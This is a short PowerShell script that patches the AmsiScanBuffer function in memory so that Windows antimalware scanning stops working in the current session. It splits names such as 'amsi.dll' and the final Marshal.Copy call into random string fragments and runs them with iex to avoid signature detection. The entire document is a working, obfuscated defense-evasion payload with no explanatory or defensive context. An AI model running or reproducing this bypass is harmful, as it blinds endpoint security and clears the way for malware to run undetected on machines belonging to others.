$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$RngSX='[Sys'
$S4XcK='tem.'
$o6z5I='Runt'
$MEYXN='ime.'
$bdsw4='Inte'
$pCEf1='ropS'
$uULGn='ervi'
$6w7ER='ces.'
$8Ipw5='Mars'
$ekxGx='hal]'
$BbJ1b='::Co'
$zbnSc='py('
$Xr3sj='$patch, '
$KzKQb='0, $'
$JmMTO='address, 6)'
($RngSX + $S4XcK + $o6z5I + $MEYXN + $bdsw4 + $pCEf1 + $uULGn + $6w7ER + $8Ipw5 + $ekxGx + $BbJ1b + $zbnSc + $Xr3sj + $KzKQb + $JmMTO) | iex
